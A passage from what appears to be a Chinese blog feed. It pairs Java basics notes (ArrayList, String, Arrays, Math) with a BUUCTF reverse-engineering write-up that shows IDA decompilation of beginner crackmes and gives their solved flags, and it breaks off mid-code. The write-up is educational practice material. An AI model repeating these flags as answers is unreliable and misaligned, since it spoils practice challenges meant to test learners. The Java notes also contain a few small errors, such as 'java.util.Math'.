class="line"><span class="comment">// 备注: 从JDK 1.7+ 开始, 右侧的尖括号内可以不写, 但尖括号还是要写的</span></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向集合中添加一些数据, 需要用到add方法</span></span><br><span class="line">list.add(<span class="string">&quot;Lantern&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;Lantern2&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line"><span class="comment">// list.add(100);  // 报错！</span></span><br></pre></td></tr></table></figure><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><ul><li>不常用可以查询API文档</li><li><code>public boolean add(E e)</code>: 向集合当中添加元素, 参数的类型和泛型一致<ul><li>对于<code>ArrayList</code>集合来说, add添加动作一定是成功的, 所以返回值可用可不用, 但是对于其他集合来说, add动作不一定成功</li></ul></li><li><code>public E get(int index)</code>:从集合当中获取元素, 参数是索引编号, 返回值就是对应位置的元素</li><li><code>public E remove(int index)</code>: 从集合当中删除元素, 参数是索引编号, 返回值就是删除掉的元素</li><li><code>public int size()</code>: 获取集合的尺寸长度, 返回值为集合中包含的元素个数</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;Lantern&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;Lantern1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;Lantern2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从集合中获得元素, get 索引从0开始</span></span><br><span class="line">String name = list.get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从集合中删除元素, remove 索引值从0开始</span></span><br><span class="line">String whoRemoved = list.remove(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得集合的长度</span></span><br><span class="line"><span class="keyword">int</span> size = list.size();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历集合的元素</span></span><br><span class="line"><span class="keyword">for</span> (String s : list) &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="存储基本类型"><a href="#存储基本类型" class="headerlink" title="存储基本类型"></a>存储基本类型</h4><ul><li>如果要存储基本类型, 必须使用基本类型对应的<code>包装类</code>（引用数据类型, 包装类都位于java.lang下）</li></ul><table><thead><tr><th>基本类型</th><th>包装类</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>boolean</td><td>Boolean</td></tr></tbody></table><ul><li><p>从JDK 1.5+开始, 支持自动装箱, 自动拆箱</p><ul><li>自动装箱: 基本类型 –&gt; 包装类</li><li>自动拆箱:包装类–&gt; 基本类型</li></ul></li><li><p>使用(以<code>Integer</code>为例)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; listInt = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">listInt.add(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num = listInt.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ul><li><code>java.lang.String</code></li><li>程序中所有的双引号字符串全是String类的对象</li><li>字符串内的内容不可改变</li><li>字符串可以共享</li><li>效果上相当于char[]字符数组, 但底层原理是byte[]字节数组【在<code>JDK 1.8</code>也就是<code>Java 8</code>中看到的其实是 <code>char[]</code>字符数组, <code>Java 9</code>中对其进行了优化, 使用了<code>byte[]</code>字节数组来节省空间(如使用字母时char需要两个字节, 而byte只需要一个字节)】</li></ul><p><code>Ctrl + Alt</code>点击<code>String</code>查看定义:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">String</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span>, <span class="title">Comparable</span>&lt;<span class="title">String</span>&gt;, <span class="title">CharSequence</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The value is used for character storage. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span> value[];</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><h4 id="创建字符串"><a href="#创建字符串" class="headerlink" title="创建字符串"></a>创建字符串</h4><ul><li><code>public String()</code>: 创建一个空白字符串, 不含有任何内容</li><li><code>public String(char[] array)</code>: 根据字符数组的内容, 来创建对应的字符串</li><li><code>public String(byte[] array)</code>: 根据字节数组的内容, 来创建对应的字符串</li><li><code>String str = &quot;xxxx&quot;</code>:直接创建, 也是对象</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str = <span class="keyword">new</span> String();</span><br><span class="line">System.out.println(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>[] chars  = &#123;<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>&#125;;</span><br><span class="line">String str2 = <span class="keyword">new</span> String(chars);</span><br><span class="line">System.out.println(str2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] bytes = &#123;<span class="number">97</span>, <span class="number">98</span> , <span class="number">99</span>&#125;;</span><br><span class="line">String str3 = <span class="keyword">new</span> String(bytes);</span><br><span class="line">System.out.println(str3);</span><br><span class="line"></span><br><span class="line">String string = <span class="string">&quot;Hello&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="字符串的常量池"><a href="#字符串的常量池" class="headerlink" title="字符串的常量池"></a>字符串的常量池</h4><p>程序当中直接写上双引号的字符串, 就在字符串常量池中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">String str2 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>[] chars = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">String str3 = <span class="keyword">new</span> String(chars);</span><br><span class="line"></span><br><span class="line">System.out.println(str1 == str2);</span><br><span class="line">System.out.println(str1 == str3);</span><br><span class="line">System.out.println(str3 == str2);</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">true</span></span><br><span class="line"><span class="keyword">false</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure><ul><li>对于基本类型来说, <code>==</code>是【数值】比较</li><li>对于引用类型来说, <code>==</code>是【地址值】的比较</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-string.jpg" alt="java-string"></p><ul><li>对于<code>&quot;&quot;</code>双引号直接括起来的字符串, 在常量池当中</li><li>读于<code>new</code>出来的字符串, 不在常量池中</li></ul><h4 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h4><h5 id="字符比较"><a href="#字符比较" class="headerlink" title="字符比较"></a>字符比较</h5><ul><li><p><code>public boolean equals(Object obj)</code>: 参数可以是任何对象, 只有参数是一个字符串并内容相同的才会给<code>true</code></p><ul><li><p>任何对象都可以用<code>Object</code>进行接受</p></li><li><p>具有对称性<code>a.equals(b)</code>和<code>b.equlas(a)</code>效果相同</p></li><li><p>如果比较双方一个常量一个变量, 推荐把<code>常量</code>字符写在<code>前面</code></p><ul><li><p>推荐: <code>&quot;abc&quot;.equals(str)</code></p></li><li><p>不推荐:<code>str.equals(&quot;abc&quot;)</code></p></li><li><p>理由</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str = <span class="keyword">null</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;abc&quot;</span>.equals(str)); <span class="comment">// false</span></span><br><span class="line">System.out.println(str.equals(<span class="string">&quot;abc&quot;</span>)); <span class="comment">// 报错:空指针异常 NullPointerException</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><code>public boolean equalsIgnoreCase(String str)</code>: 参数是字符串, 忽略大小写判断</p></li></ul><p>使用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] chars = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>&#125;;</span><br><span class="line">String str2 = <span class="keyword">new</span> String(chars);</span><br><span class="line"></span><br><span class="line">System.out.println(str1.equals(str2));</span><br><span class="line">System.out.println(str2.equals(<span class="string">&quot;Hello&quot;</span>));</span><br><span class="line">System.out.println(<span class="string">&quot;Hello&quot;</span>.equals(str1));</span><br><span class="line"></span><br><span class="line">String str3 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        System.out.println(str3.equalsIgnoreCase(str2));</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">true</span></span><br><span class="line"><span class="keyword">true</span></span><br><span class="line"><span class="keyword">true</span></span><br><span class="line"><span class="keyword">true</span></span><br></pre></td></tr></table></figure><h5 id="字符获取"><a href="#字符获取" class="headerlink" title="字符获取"></a>字符获取</h5><ul><li><code>public int length()</code>: 获取字符串当中含有的字符个数, 拿到字符串长度</li><li><code>public String concat(String str)</code>: 将当前字符串和参数字符串拼接成为返回值(新的字符串)</li><li><code>public char charAt(int index)</code>: 获取指定索引位置的单个字符(从0开始)</li><li><code>public int indexOf(String str)</code>: 查找参数字符串在本字符串当中首次出现的索引位置</li></ul><h5 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h5><ul><li><code>public String subtring(int index)</code>: 截取从参数位置一直到字符串末尾, 返回新字符串</li><li><code>public String substring(int begin, int end)</code>: 截取从begin开始, 一直到end结束, 中间的字符串。 备注: <code>[begin, end)</code>, 包含左边, 不含右边</li></ul><h5 id="字符串转换"><a href="#字符串转换" class="headerlink" title="字符串转换"></a>字符串转换</h5><ul><li><code>public char[] toCharArray()</code>: 将当前字符串拆分成为字符数组作为返回值</li><li><code>public byte[] getBytes()</code>:获取当前字符串底层的字节数组</li><li><code>public String replace(CharSequence oldString, CharSequence newString)</code>: 将所有出现的老字符串替换为新的字符串, 返回替换之后的新字符串</li></ul><h5 id="字符串切割"><a href="#字符串切割" class="headerlink" title="字符串切割"></a>字符串切割</h5><ul><li><code>public String[] split(String regex)</code>: 根据regex的规则, 将字符串切分成若干部分(由于<code>,</code>用于切分因此生成的字符串数组中的字符串不包含<code>,</code>)</li><li>实际上, <code>split</code>方法的参数其实是正则表达式, 因此当我们<code>string.split(&#39;.&#39;)</code>时并不会用<code>.</code>进行切割, 因为<code>.</code>在正则中有特殊的含义, 因此我们必须写<code>string.split(&#39;\\.&#39;)</code>, 用<code>\\</code>来转义</li></ul><h3 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h3><ul><li><p><code>java.util.Arrays</code>: 一个与数组相关的工具类, 里面提供了大量的静态方法, 用来实现数组的常见操作</p></li><li><p><code>public static String toString(数组)</code>:将参数数组变成字符串</p></li><li><p><code>public static void sort(数组)</code>: 按默认升序(从小到大)对数组元素进行排序</p><ul><li>如果时数值, sort默认按照默认升序(从小到大)对数组元素进行排序</li><li>如果时字符串, 按字母升序排序</li><li>如果时自定义类型, 则必须要有<code>Comparrable</code>或者<code>Comparator</code>接口的支持</li></ul></li></ul><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><ul><li><code>java.util.Math</code>: 数学工具类, 提供了大量静态方法, 完成于数学运算相关的操作</li><li><code>public static double abs(double num)</code>: 获取绝对值</li><li><code>public static double ceil(double num)</code>: 向上取整</li><li><code>public static double floor(double num)</code>: 向下取整</li><li><code>public static long round(double num)</code>: 四舍五入</li><li><code>Math.PI</code>:近似圆周率</li></ul><h2 id="Java项目结构"><a href="#Java项目结构" class="headerlink" title="Java项目结构"></a>Java项目结构</h2><p><img src="D:%5CBlog%5Cblog-code%5Csource%5C_posts%5Cnote%5Clanguage%5Cjava-note%5Cjava-project_structure.png" alt="java-project_structure"></p><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><ul><li><code>iml</code>: 配置文件</li><li><code>src</code>: 代码</li><li><code>External Libraries</code>: JDK的文件</li><li><code>psvm</code>一键生成<code>public static void main(String[] args)</code></li><li><code>sout</code>一键生成<code>System.out.println();</code></li><li><code>Alt + Insert</code> 一键生成<code>Getter/Setter</code>方法</li></ul>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ 题库练习</title>
      <link href="/wp-games-buuctf/"/>
      <url>/wp-games-buuctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>是北京联合大学的一个平台,题目有在更新,但是个人感觉题目难度很迷,不过是动态积分的方式,难度也可以看出来就是了。</p><p>Write Up持续更新, 有空就刷, 希望有一天能够刷穿题库</p><p>练习平台:<a href="https://buuoj.cn/">BUUCTF</a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>IDA打开,main函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> a; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">  <span class="keyword">if</span> ( a == b )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry,you can&#x27;t get flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a>helloword</h3><p>jeb3打开,MainActivity:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method protected onCreate(Bundle)V</span><br><span class="line">          .registers 6</span><br><span class="line">00000000  invoke-super        ActionBarActivity-&gt;onCreate(Bundle)V, p0, p1</span><br><span class="line">00000006  const               v3, 0x7F030018</span><br><span class="line">0000000C  invoke-virtual      MainActivity-&gt;setContentView(I)V, p0, v3</span><br><span class="line">00000012  const-string        v0, &quot;flag&#123;7631a988259a00816deda84afb29430a&#125;&quot;</span><br><span class="line">00000016  const-string        v1, &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">0000001A  invoke-virtual      String-&gt;compareTo(String)I, v0, v1</span><br><span class="line">00000020  move-result         v2</span><br><span class="line">00000022  return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>IDA打开,追踪字符串到主要函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1400118C0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+128h] [rbp+108h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">82</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = j_strlen(Str2);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( Str2[j] == <span class="number">111</span> )</span><br><span class="line">      Str2[j] = <span class="number">48</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1400111D1(<span class="string">&quot;input the flag:&quot;</span>);</span><br><span class="line">  sub_14001128F(<span class="string">&quot;%20s&quot;</span>, &amp;Str1);</span><br><span class="line">  v3 = j_strlen(Str2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;Str1, Str2, v3) )</span><br><span class="line">    sub_1400111D1(<span class="string">&quot;this is the right flag!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_1400111D1(<span class="string">&quot;wrong flag\n&quot;</span>);</span><br><span class="line">  sub_14001113B(&amp;v5, &amp;unk_140019D00);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看Str2:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:000000014001C000 Str2            db &#x27;&#123;hello_world&#125;&#x27;,0</span><br></pre></td></tr></table></figure><p>flag{hello_world}</p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>IDA打开,主函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( pid )</span><br><span class="line">  &#123;</span><br><span class="line">    argv = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;stat_loc;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] == <span class="string">&#x27;i&#x27;</span> || flag[i] == <span class="string">&#x27;r&#x27;</span> )</span><br><span class="line">        flag[i] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag:&quot;</span>, argv);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%20s&quot;</span>, &amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, &amp;s2) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;this is the right flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000601080 flag            db &#x27;&#123;&#x27;                  ; DATA XREF: main+34↑r</span><br><span class="line">.data:0000000000601080                                         ; main+44↑r ...</span><br><span class="line">.data:0000000000601081 aHackingForFun  db &#x27;hacking_for_fun&#125;&#x27;,0</span><br></pre></td></tr></table></figure><p>由于前面:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] == <span class="string">&#x27;i&#x27;</span> || flag[i] == <span class="string">&#x27;r&#x27;</span> )</span><br><span class="line">        flag[i] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>so,最终flag为:</p><p>flag{hack1ng_fo1_fun}</p><h3 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h3><p>IDA打开,查看字符串发现base64 table表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:00407830 byte_407830     db 41h                  ; DATA XREF: sub_401000+C0↑r</span><br><span class="line">.rdata:00407831 aBcdefghijklmno db &#x27;BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;,0</span><br></pre></td></tr></table></figure><p>整理一下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rdata:00407830 aAbcdefghijklmn db &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span><br></pre></td></tr></table></figure><p>追到判断函数,根据经验修改类型和大小:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> key[<span class="number">11</span>]; <span class="comment">// [esp+8h] [ebp-20030h]</span></span><br><span class="line">  CHAR input[<span class="number">8</span>]; <span class="comment">// [esp+34h] [ebp-20004h]</span></span><br><span class="line">  CHAR v9; <span class="comment">// [esp+10034h] [ebp-10004h]</span></span><br><span class="line">  CHAR v10; <span class="comment">// [esp+10035h] [ebp-10003h]</span></span><br><span class="line">  CHAR v11; <span class="comment">// [esp+10036h] [ebp-10002h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, input, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      key[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      key[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      key[<span class="number">2</span>] = <span class="number">83</span>;</span><br><span class="line">      key[<span class="number">3</span>] = <span class="number">69</span>;</span><br><span class="line">      key[<span class="number">4</span>] = <span class="number">67</span>;</span><br><span class="line">      key[<span class="number">5</span>] = <span class="number">97</span>;</span><br><span class="line">      key[<span class="number">6</span>] = <span class="number">78</span>;</span><br><span class="line">      key[<span class="number">7</span>] = <span class="number">72</span>;</span><br><span class="line">      key[<span class="number">8</span>] = <span class="number">51</span>;</span><br><span class="line">      key[<span class="number">9</span>] = <span class="number">110</span>;</span><br><span class="line">      key[<span class="number">10</span>] = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0(key, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v9 = input[<span class="number">5</span>];</span><br><span class="line">      v11 = input[<span class="number">7</span>];</span><br><span class="line">      v10 = input[<span class="number">6</span>];</span><br><span class="line">      v4 = base64((<span class="keyword">int</span>)&amp;v9, <span class="built_in">strlen</span>(&amp;v9));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v10 = input[<span class="number">3</span>];</span><br><span class="line">      v9 = input[<span class="number">2</span>];</span><br><span class="line">      v11 = input[<span class="number">4</span>];</span><br><span class="line">      v5 = base64((<span class="keyword">int</span>)&amp;v9, <span class="built_in">strlen</span>(&amp;v9));</span><br><span class="line">      <span class="keyword">if</span> ( input[<span class="number">0</span>] == key[<span class="number">0</span>] + <span class="number">34</span></span><br><span class="line">        &amp;&amp; input[<span class="number">1</span>] == key[<span class="number">4</span>]</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * input[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * key[<span class="number">2</span>]</span><br><span class="line">        &amp;&amp; input[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (key[<span class="number">7</span>] / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sub_4010F0(key, 0, 10):</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> num_10)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = num_10;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= num_10; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = a1[i];</span><br><span class="line">    <span 